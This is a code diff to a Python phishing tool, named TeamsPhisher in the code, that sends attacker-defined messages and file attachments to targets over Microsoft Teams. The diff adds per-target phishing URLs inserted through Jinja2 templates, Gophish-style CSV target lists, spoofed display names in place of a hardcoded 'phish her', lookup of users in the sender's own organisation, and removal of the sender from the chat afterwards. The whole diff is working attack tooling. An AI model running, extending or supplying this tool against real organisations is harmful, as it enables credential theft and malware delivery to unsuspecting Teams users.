@@ -4,6 +4,7 @@ import argparse
 import requests
 import json
 import os.path
+import jinja2
 import sys
 import time
 from msal import PublicClientApplication
@@ -12,6 +13,7 @@ import datetime
 from os.path import expanduser
 import hashlib
 from string import Template
+from csv import DictReader
 
 
 ## Global Options and Variables ##
@@ -231,6 +233,7 @@ def getSenderInfo(token, msa=False):
         senderInfo = json.loads(response.text)
         p_info("Sender Info: %s" % json.dumps(senderInfo))
         senderInfo["id"] = senderInfo["mri"] = "8:"+senderInfo["skypeName"]
+        return senderInfo
     else:
         headers = {
             "Authorization": "Bearer %s" % (token["access_token"])
@@ -281,7 +284,7 @@ def getSenderInfo(token, msa=False):
         else:
             p_err("Could not find the sender's user information!", True)
 
-    return senderInfo
+    return senderInfo, users
 
 def authenticate(args):
 
@@ -292,15 +295,15 @@ def authenticate(args):
         skypeToken = getSkypeToken(getBearerToken(args.username, consumers["skype"]["scope"], consumers["skype"]["id"], consumers["authority"]))
         teamsgroupssvcToken = getBearerToken(args.username, consumers["teamsgroupssvc"]["scope"], consumers["teamsgroupssvc"]["id"], consumers["authority"])
         senderInfo = getSenderInfo(skypeToken, msa=True)
-        return bToken, skypeToken, onedriveToken, teamsgroupssvcToken, senderInfo
+        return bToken, skypeToken, onedriveToken, teamsgroupssvcToken, senderInfo, None
     else:
-        # If given username + password
-        if args.username and args.password:
+        # If given username (+ password)
+        if args.username:
             organizations = msids["organizations"]
             authority = organizations["authority"].substitute(tenant=getTenantID(args.username))
             bToken = getBearerToken(args.username, organizations["teams"]["scope"], organizations["teams"]["id"], authority, args.password)
             skypeToken = getSkypeToken(bToken)
-            senderInfo = getSenderInfo(bToken)
+            senderInfo, senderUsers = getSenderInfo(bToken)
             # Fetch sharepointToken passing in alternate vars for scope depending on whether specified a specific sharepoint domain to use.
             sharepointScope = organizations["sharepoint"]["scope"].substitute(tenant=senderInfo.get('tenantName'))
             sharepointToken = getBearerToken(args.username, sharepointScope, organizations["sharepoint"]["id"], authority, args.password)
@@ -309,7 +312,7 @@ def authenticate(args):
         else:
             p_err("You must provide a username AND password!", True)
 
-        return bToken, skypeToken, sharepointToken, None, senderInfo
+        return bToken, skypeToken, sharepointToken, None, senderInfo, senderUsers
 
 def findFriendlyName(targetInfo):
 
@@ -330,21 +333,22 @@ def findFriendlyName(targetInfo):
 
     return friendlyName
     
-def jsonifyMessage(message):
+def jsonifyMessage(message, url=None):
     
     jsonMessage = ""
 
     # Read in message
     with open(message) as f:
-        lines = f.readlines()
+        fileContent = f.read()
     f.close()
 
+    # replace url from jinja2 template
+    if url is not None:
+        fileContent = jinja2.Template(fileContent).render(url=url)
+
     # Iterate through lines in message and add proper formatting tags in order to preserve newlines
-    for line in lines:
-        if line == "\n":
-            jsonMessage = jsonMessage + "<p>&nbsp;</p>"
-        else:
-            jsonMessage = jsonMessage + "<p>%s</p>" % (line)
+    for line in fileContent.split("\n"):
+        jsonMessage += ("<p>&nbsp;</p>" if line == "" else "<p>%s</p>" % (line))
 
     return jsonMessage
 
@@ -362,6 +366,11 @@ def enumUser(bearer, email, skypeToken=None):
         url = "https://teams.live.com/api/mt/beta/users/searchUsers"
         user = {"emails":[email],"phones":[]}
         content = requests.post(url,data=json.dumps(user),headers=headers)
+    # check if target user tenant is same as sender user tenant (internal org user)
+    elif email.split("@")[-1].split(".")[0] == senderInfo['tenantName']:
+        for user in senderUsers:
+            if user['userPrincipalName'] == email:
+                return user
     else:
         content = requests.get("https://teams.microsoft.com/api/mt/emea/beta/users/%s/externalsearchv3?includeTFLUsers=true" % (email), headers=headers)
 
@@ -493,14 +502,14 @@ def removeExternalUser(skypeToken, senderInfo, threadID, targetInfo, msa=False):
     thread = response.json()
 
     # Delete the target user from the thread
-    content = requests.delete(f"{baseUrl}/v1/threads/{threadID}/members/{targetInfo.get('mri')}", headers=headers)
+    content = requests.delete(f"{baseUrl}/v1/threads/{threadID}/members/{senderInfo.get('mri')}", headers=headers)
     if content.status_code != 204 and content.status_code != 200:
         p_warn("Error removing user: %d" % (content.status_code))
         p_warn(content.text)
         return None
 
 
-def sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting, msa=False):
+def sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting, msa=False, targetUrl=None, displayname=None):
 
     if msa:
         baseUrl = "https://msgapi.teams.live.com"
@@ -524,7 +533,7 @@ def sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, sender
     }
 
     # Format supplied message to be json friendly
-    jsonMsg = jsonifyMessage(message)
+    jsonMsg = jsonifyMessage(message, targetUrl)
 
     # If --nogreeting specified, initialize introduction
     if nogreeting:
@@ -544,33 +553,45 @@ def sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, sender
     assembledMessage = introduction + jsonMsg
 
     if msa:
+        if inviteInfo is None:
+            filesLink = ""
+        else:
+            filesLink = """
+            "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":\\"%s\\",\\"fileUrl\\":\\"%s\\",\\"siteUrl\\":\\"\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
+            """ % (uploadInfo.get('id'), attachment.split(".")[-1], os.path.basename(attachment), uploadInfo.get('webUrl'), uploadInfo.get('id'), os.path.basename(attachment), attachment.split(".")[-1], uploadInfo.get('id'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('id'))
         body = """{
         "content": "%s",
         "messagetype": "RichText/Html",
         "contenttype": "text",
         "amsreferences": [],
         "clientmessageid": "3529890327684204137",
-        "imdisplayname": "phish her",
+        "imdisplayname": "%s",
         "properties": {
-            "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":\\"%s\\",\\"fileUrl\\":\\"%s\\",\\"siteUrl\\":\\"\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
+            %s
             "importance": "",
             "subject": ""
         }
-    }""" % (assembledMessage, uploadInfo.get('id'), attachment.split(".")[-1], os.path.basename(attachment), uploadInfo.get('webUrl'), uploadInfo.get('id'), os.path.basename(attachment), attachment.split(".")[-1], uploadInfo.get('id'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('link').get('webUrl'), inviteInfo.get('id'))
+    }""" % (assembledMessage, displayname, filesLink)
     else:
+        if inviteInfo is None:
+            filesLink = ""
+        else:
+            filesLink = """
+                "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"%s/personal/%s/\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"providerData\\":\\"\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":null,\\"fileUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"siteUrl\\":\\"%s/personal/%s/\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"permissionScope\\":\\"anonymous\\",\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
+            """ % (uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
         body = """{
             "content": "%s",
             "messagetype": "RichText/Html",
             "contenttype": "text",
             "amsreferences": [],
             "clientmessageid": "3529890327684204137",
-            "imdisplayname": "phish her",
+            "imdisplayname": "%s",
             "properties": {
-                "files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"%s/personal/%s/\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"providerData\\":\\"\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":null,\\"fileUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"siteUrl\\":\\"%s/personal/%s/\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"permissionScope\\":\\"anonymous\\",\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",
+                %s
                 "importance": "",
                 "subject": ""
             }
-        }""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
+        }""" % (assembledMessage, displayname, filesLink)
     
     # Send Message
     content = requests.post(url, headers=headers, data=body.encode(encoding='utf-8'))
@@ -728,7 +749,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-u', '--username', dest='username', type=str, required=True,  help='Username for authentication')
     parser.add_argument('-p', '--password', dest='password', type=str, required=False, help='Password for authentication')
-    parser.add_argument('-a', '--attachment', dest='attachment', type=str, required=True, help='Full path to the attachment to send to targets.')
+    parser.add_argument('-a', '--attachment', dest='attachment', type=str, required=False, help='Full path to the attachment to send to targets.')
     parser.add_argument('-m', '--message', dest='message', type=str, required=True, help='A file containing a message to send with attached file.')
     parser.add_argument('-s', '--sharepoint', dest='sharepoint', type=str, required=False, help='Manually specify sharepoint name (e.g. mytenant.sharepoint.com would be --sharepoint mytenant)')  
     parser.add_argument('--msa', dest='msa', action="store_true", help='Use MSA account instead of organizational account type.')
@@ -736,9 +757,12 @@ if __name__ == "__main__":
     # Target group. Choose either a single email or a list of emails.
     parser_target_group = parser.add_mutually_exclusive_group(required=True)
     parser_target_group.add_argument('-e', '--targetemail', dest='email', type=str, required=False, help='Single target email address')
-    parser_target_group.add_argument('-l', '--list', dest='list', type=str, required=False, help='Full path to a file containing target emails. One per line.')    
+    parser_target_group.add_argument('-c', '--csvlist', dest='csvlist', type=str, required=False, help='Full path to a csv file containing targets with unique phishing URL (e.g. Gophish).')
+    parser_target_group.add_argument('-l', '--list', dest='list', type=str, required=False, help='Full path to a file containing target emails. One per line.')
 
-    parser.add_argument('--greeting', dest='greeting', type=str, required=False, help='Override default greeting with a custom one. Use double quotes if including spaces!')    
+    parser.add_argument('--displayname', dest='displayname', type=str, required=False, help='Specify custom Teams displayname')
+    parser.add_argument('--url', dest='url', type=str, required=False, help='Specify phishing URL for single target or when using in preview mode.')
+    parser.add_argument('--greeting', dest='greeting', type=str, required=False, help='Override default greeting with a custom one. Use double quotes if including spaces!')
     parser.add_argument('--securelink', dest='securelink', action='store_true', required=False, help='Send link to file only viewable by the individual target recipient.')
     parser.add_argument('--personalize', dest='personalize', action='store_true', required=False, help='Try and use targets names in greeting when sending messages.') 
     parser.add_argument('--preview', dest='preview', action='store_true', required=False, help='Run in preview mode. See personalized names for targets and send test message to sender\'s Teams.')         
@@ -816,9 +840,23 @@ if __name__ == "__main__":
     numSent = 0
 
     # Populate list of emails
+    targets = []
     if args.email:
         targets = [args.email]
         numTargets = 1
+    elif args.csvlist:
+        p_task("Reading target csv list...")
+        try:
+            with open(args.csvlist) as f:
+                targetsReader = DictReader(f,delimiter=',')
+                if not all(field in targetsReader.fieldnames for field in ['url','email']):
+                    raise KeyError("Could not read header row values 'url' and 'email' from csvlist")
+                targets = list(targetsReader)
+                numTargets = len(targets)
+            f.close()
+            p_success("SUCCESS!")
+        except Exception as e:
+            p_err("Could not read supplied list of emails!\nError: %s" % e, True)
     else:
         p_task("Reading target email list...")
         try:
@@ -831,37 +869,39 @@ if __name__ == "__main__":
             p_err("Could not read supplied list of emails!", True)
 
     # Check to make sure attachment file exists
-    if not os.path.isfile(args.attachment):
-        p_err("Cannot locate %s!" % (args.attachment), True)
+    if args.attachment:
+        if not os.path.isfile(args.attachment):
+            p_err("Cannot locate %s!" % (args.attachment), True)
 
     # Check to make sure message file exists
     if not os.path.isfile(args.message):
         p_err("Cannot locate %s!" % (args.message), True)
 
     # Authenticate and fetch our tokens and sender info
-    bToken, skypeToken, storageToken, teamsgroupssvcToken, senderInfo = authenticate(args)
+    bToken, skypeToken, storageToken, teamsgroupssvcToken, senderInfo, senderUsers = authenticate(args)
 
-    # Assemble Sharepoint name + Senders drive for later use
-    # If user-specified sharepoint was provided, assemble using that value otherwise do so using senderInfo
-    senderDrive = args.username.replace("@", "_").replace(".", "_").lower()
-    if args.sharepoint:
-        senderSharepointURL = "https://%s-my.sharepoint.com" % (args.sharepoint)
-    elif args.msa:
-        senderSharepointURL = None
-        senderDrive = None
-    else:
-        senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')
+    uploadId = uploadInfo = senderSharepointURL = senderDrive = None
+    if args.attachment:
+        # Assemble Sharepoint name + Senders drive for later use
+        # If user-specified sharepoint was provided, assemble using that value otherwise do so using senderInfo
+        senderDrive = args.username.replace("@", "_").replace(".", "_").lower()
+        if args.sharepoint:
+            senderSharepointURL = "https://%s-my.sharepoint.com" % (args.sharepoint)
+        elif args.msa:
+            senderSharepointURL = senderDrive = None
+        else:
+            senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')
 
-    # Upload file to sharepoint/onedrive that will be sent as an attachment in chats
-    uploadInfo = uploadFile(storageToken, args.attachment, senderSharepointURL, senderDrive)
-    if args.msa:
-        uploadId = uploadInfo.get('id')
-    else:
-        uploadId = uploadInfo.get('sharepointIds').get('listItemUniqueId')
+        # Upload file to sharepoint/onedrive that will be sent as an attachment in chats
+        uploadInfo = uploadFile(storageToken, args.attachment, senderSharepointURL, senderDrive)
+        if args.msa:
+            uploadId = uploadInfo.get('id')
+        else:
+            uploadId = uploadInfo.get('sharepointIds').get('listItemUniqueId')
 
-    # Hash file and output for logging/tracking purposes
-    p_info("\nHashing file\n")
-    hashFile(args.attachment)
+        # Hash file and output for logging/tracking purposes
+        p_info("\nHashing file\n")
+        hashFile(args.attachment)
 
     # If preview mode, we are sending the phishing message to our own account so we can review it.
     # To facilitiate this, 'senderInfo' is passed to getInviteLink for both the sender and the target info fields within the function
@@ -871,12 +911,11 @@ if __name__ == "__main__":
         p_task("%s" % (args.username))
 
         # Retrieve an invite link for the uploaded file
-        inviteInfo = getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, senderInfo, args.securelink)
-        if(inviteInfo):
-            threadID = None
-
-            # Send attacker-defined message to ourselves for review
-            success = sendMessage(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)
+        inviteInfo = (None if not args.attachment else getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, senderInfo, args.securelink))
+        threadID = None
+        
+        # Send attacker-defined message to ourselves for review
+        success = sendMessage(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.msa, args.url, args.displayname)
 
         p_info("\nPreviewing customized names identified by TeamsPhisher\n")
     else:
@@ -884,6 +923,12 @@ if __name__ == "__main__":
 
     ## LOOP THROUGH USERS ##
     for target in targets:
+        targetUrl = None
+        if type(target) == dict:
+            targetUrl = target['url']
+            target = target['email']
+        elif args.url:
+            targetUrl = args.url
         p_task("%s" % (target))
 
         if "@" not in target:
@@ -921,14 +966,17 @@ if __name__ == "__main__":
 
                 if threadID:
                     # Retrieve an invite link for the uploaded file
-                    inviteInfo = getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, targetInfo, args.securelink)
-                    if inviteInfo:
-                        # Send attacker-defined message to target with file sharing URL
-                        success = sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.msa)
-                        removeExternalUser(skypeToken, senderInfo, threadID, targetInfo, args.msa)
-                    else:
+                    inviteInfo = (None if not args.attachment else getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, targetInfo, args.securelink))
+                    if inviteInfo is None and args.attachment:
                         numFailed += 1
                         continue
+                    else:
+                        # Send attacker-defined message to target with file sharing URL
+                        if not sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.msa, targetUrl, args.displayname):
+                            numFailed += 1
+                            continue
+                        removeExternalUser(skypeToken, senderInfo, threadID, targetInfo, args.msa)
+                        numSent += 1
                 else:
                     numFailed += 1
                     continue
